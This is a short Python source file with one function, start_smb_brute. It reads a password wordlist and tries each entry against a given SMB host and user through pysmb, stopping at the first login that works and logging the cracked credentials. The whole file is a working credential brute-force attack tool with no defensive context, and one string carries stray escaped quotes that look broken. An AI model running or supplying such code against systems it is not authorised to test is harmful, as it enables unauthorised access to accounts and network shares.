from smb.SMBConnection import SMBConnection

def start_smb_brute(host, port, user, wordlist_path, verbose, logger):
    with open(wordlist_path) as f:
        for password in f:
            password = password.strip()
            try:
                conn = SMBConnection(user, password, \"BruteVector\", host, use_ntlm_v2=True)
                if conn.connect(host, int(port), timeout=3):
                    logger(f"[+] SUCCESS: {user}:{password}")
                    conn.close()
                    return
            except Exception as e:
                if verbose:
                    logger(f"[-] Tried {user}:{password} - {e}")
    logger("[-] SMB brute-force finished.")
